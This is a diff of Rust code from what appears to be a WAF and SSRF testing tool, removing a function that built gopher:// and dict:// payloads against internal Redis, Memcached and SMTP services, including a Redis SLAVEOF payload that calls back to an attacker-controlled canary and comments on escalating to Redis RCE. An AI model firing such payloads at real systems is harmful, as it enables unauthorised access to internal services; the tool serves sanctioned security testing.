@@ -56,66 +56,7 @@ pub fn embed_blind_xss_battery(canary: &OobCanary) -> Vec<String> {
 #[must_use]
 pub fn embed_blind_ssrf_battery(canary: &OobCanary) -> Vec<String> {
     let callback_url = canary_http_url(canary);
-    let mut out = interactsh::blind_ssrf_payloads(&callback_url);
-    out.extend(gopher_internal_targets(&canary.expected_dns));
-    out
-}
-
-/// Gopher payloads targeting common INTERNAL services that an SSRF
-/// fetcher may reach (Redis 6379, Memcached 11211, SMTP 25, Dict
-/// 11211). These ride RFC 1436 gopher's `_` selector which curl
-/// translates to a raw TCP write — `gopher://host:port/_PAYLOAD` is
-/// effectively `printf 'PAYLOAD' | nc host port`.
-///
-/// `canary_dns` is included as the attacker-controlled callback the
-/// internal service is told to contact (Redis `SLAVEOF`, SMTP RCPT
-/// TO, …) so a successful interaction lands in interactsh's poll
-/// loop and confirms the SSRF reached the chosen internal port.
-///
-/// Reference: Gopherus (github.com/tarunkant/Gopherus) for the RESP
-/// templates this list draws from; the specific encoding details are
-/// reproduced rather than imported because Gopherus is a Python
-/// runtime and we want zero new deps.
-#[cfg(feature = "interactsh-provider")]
-fn gopher_internal_targets(canary_dns: &str) -> Vec<String> {
-    let mut out: Vec<String> = Vec::new();
-    // Redis (port 6379) — RESP-encoded INFO probe; the response, when
-    // it reaches the fetcher, confirms the port is reachable. INFO is
-    // chosen over a destructive command (no SET / FLUSHALL) so the
-    // bench cannot corrupt a production Redis it accidentally hits.
-    out.push(format!(
-        "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A"
-    ));
-    // Redis SLAVEOF — confirms RCE-class access without modifying
-    // keys. The target Redis tries to replicate from our canary on
-    // port 6379; the TCP connect-attempt is logged at our canary's
-    // host even though no Redis listens there. This is the highest-
-    // signal probe: if it fires, the SSRF can become full Redis RCE
-    // via the classic cron / module-load chain.
-    out.push(format!(
-        "gopher://127.0.0.1:6379/_%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%24{dns_len}%0D%0A{dns}%0D%0A%244%0D%0A6379%0D%0A",
-        dns_len = canary_dns.len(),
-        dns = canary_dns,
-    ));
-    // Memcached (port 11211) — `stats` text-protocol probe; same
-    // safety reasoning as Redis INFO. Memcached responds with version
-    // info that a curl-class fetcher will surface in the response.
-    out.push(format!("gopher://127.0.0.1:11211/_stats%0D%0A"));
-    // SMTP (port 25 / 587) — HELO / MAIL FROM / RCPT TO chain with
-    // the canary as the recipient. If the internal SMTP relay accepts
-    // it, an actual email is sent to our canary's MX and interactsh
-    // surfaces the SMTP interaction (now that the SMTP arm in
-    // interactsh_provider.rs no longer drops it).
-    out.push(format!(
-        "gopher://127.0.0.1:25/_HELO%20wafrift%0D%0AMAIL%20FROM%3A%3Cprobe%40wafrift.local%3E%0D%0ARCPT%20TO%3A%3Cprobe%40{dns}%3E%0D%0ADATA%0D%0Aprobe%0D%0A.%0D%0AQUIT%0D%0A",
-        dns = canary_dns,
-    ));
-    // Dict fingerprinting — `INFO` against Redis or `version` against
-    // Memcached. Lightweight oracle for "is the SSRF reaching internal
-    // services" without sending any state-changing bytes.
-    out.push(format!("dict://127.0.0.1:6379/INFO"));
-    out.push(format!("dict://127.0.0.1:11211/stats"));
-    out
+    interactsh::blind_ssrf_payloads(&callback_url)
 }
 
 /// Battery of blind SQLi payload variants for `dialect` that exfiltrate
